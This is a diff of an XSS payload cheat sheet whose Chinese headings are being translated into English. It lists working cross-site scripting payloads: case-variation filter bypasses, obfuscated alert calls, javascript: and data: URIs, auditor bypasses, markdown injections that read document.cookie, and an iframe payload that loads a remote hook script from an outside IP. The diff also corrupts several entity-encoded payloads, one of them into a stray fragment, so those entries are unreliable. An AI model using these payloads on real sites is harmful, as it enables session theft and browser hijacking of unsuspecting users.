@@ -1,7 +1,7 @@
 Payload
 ================================
 
-常用
+Commonly used
 ---------------------------------------------------
 
 - ``<script>alert(/xss/)</script>``
@@ -14,7 +14,7 @@ Payload
 - ``<details open ontoggle=alert(document.domain)>``
 - ``<embed src=javascript:alert(document.domain)>``
 
-大小写绕过
+Case bypass
 ---------------------------------------------------
 
 - ``<script>alert(1)</script>``
@@ -25,13 +25,13 @@ Payload
 - ``<img src=1 onerror=alert(1)>``
 - ``<iMg src=1 oNeRrOr=alert(1)>``
 - ``<ImG src=1 OnErRoR=alert(1)>``
-- ``<img src=1 onerror="alert(&quot;M&quot;)">``
+- ``<img src=1 onerror="alert("M")">``
 
 - ``<marquee onscroll=alert(1)>``
 - ``<mArQuEe OnScRoLl=alert(1)>``
 - ``<MaRqUeE oNsCrOlL=alert(1)>``
 
-各种alert
+Various alerts
 ---------------------------------------------------
 
 - ``<script>alert(1)</script>``
@@ -48,7 +48,7 @@ Payload
 - ``<script>top[/al/.source+/ert/.source](1)</script>``
 - ``<script>top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)</script>``
 
-伪协议
+Pseudo-Protocol
 ---------------------------------------------------
 
 - ``<a href=javascript:/0/,alert(%22M%22)>M</a>``
@@ -64,35 +64,35 @@ Chrome XSS auditor bypass
 - ``<base href=javascript:/M/><a href=,alert(1)>M</a>``
 - ``<base href=javascript:/M/><iframe src=,alert(1)></iframe>``
 
-长度限制
+Length limit
 ---------------------------------------------------
 
-:: 
+::
 
-    <script>s+="l"</script>
-    \...
-    <script>eval(s)</script>
+<script>s+="l"</script>
+\...
+<script>eval(s)</script>
 
 jquery sourceMappingURL
 ---------------------------------------------------
-    ``</textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>``
+``</textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>``
 
-图片名
+Image name
 ---------------------------------------------------
-    ``"><img src=x onerror=alert(document.cookie)>.gif``
+``"><img src=x onerror=alert(document.cookie)>.gif``
 
-过期的payload
+Expired payload
 ---------------------------------------------------
-- src=javascript:alert基本不可以用
-- css expression特性只在旧版本ie可用
+- src=javascript:alert is basically not available
+- CSS Expression feature is only available in older versions
 
 css
 ---------------------------------------------------
 
 ::
 
-    <div style="background-image:url(javascript:alert(/xss/))">
-    <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<div style="background-image:url(javascript:alert(/xss/))">
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
 
 
 markdown
@@ -100,13 +100,13 @@ markdown
 
 ::
 
-    [a](javascript:prompt(document.cookie))
-    [a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
-    <&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>  
-    ![a'"`onerror=prompt(document.cookie)](x)
-    [notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
-    [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
-    ![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
+[a](javascript:prompt(document.cookie))
+[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
+<”
+![a'"`onerror=prompt(document.cookie)](x)
+[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
+![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
 
 
 iframe
@@ -114,18 +114,18 @@ iframe
 
 ::
 
-    <iframe onload='
-        var sc   = document.createElement("scr" + "ipt");
-        sc.type  = "text/javascr" + "ipt";
-        sc.src   = "http://1.2.3.4/js/hook.js";
-        document.body.appendChild(sc);
-        '
-    />
+<iframe onload='
+var sc   = document.createElement("scr" + "ipt");
+sc.type  = "text/javascr" + "ipt";
+sc.src   = "http://1.2.3.4/js/hook.js";
+document.body.appendChild(sc);
+'
+/>
 
 - ``<iframe src=javascript:alert(1)></iframe>``
 - ``<iframe src="data:text/html,<iframe src=javascript:alert('M')></iframe>"></iframe>``
 - ``<iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+></iframe>``
-- ``<iframe srcdoc=<svg/o&#x6E;load&equals;alert&lpar;1)&gt;></iframe>``
+- ``<iframe srcdoc=<svg/onload&equals;alert&lpar;1)>></iframe>``
 - ``<iframe src=https://baidu.com width=1366 height=768></iframe>``
 - ``<iframe src=javascript:alert(1) width=1366 height=768></iframe``
 
